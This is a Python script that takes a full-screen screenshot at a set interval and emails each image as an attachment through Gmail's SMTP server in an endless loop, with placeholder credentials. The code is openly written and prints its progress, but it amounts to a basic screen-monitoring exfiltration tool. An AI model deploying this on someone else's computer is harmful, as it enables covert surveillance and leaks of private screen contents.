import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyscreenshot as ImageGrab
from argparse import ArgumentParser
import time

def make_screenshot(path):
    im = ImageGrab.grab()
    im.save(path)
    
def send_message(filename):
    subject = "An email with attachment from Python"
    body = "This is an email with attachment sent from Python"
    sender_email = "write email from which you sending"
    receiver_email = "write email to which you sending"
    password = "password for the first one"

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)

parser = ArgumentParser()
parser.add_argument('--time', type=int)

args = parser.parse_args()

start = time.time()
#args.time = 5
print(args.time)
while True:
    if time.time() - start > args.time:
        name = 'path where to save this screenshot'
        make_screenshot(name)
        print("Screenshot done")
        send_message(name)
        print("message sent")
        start = time.time()
        
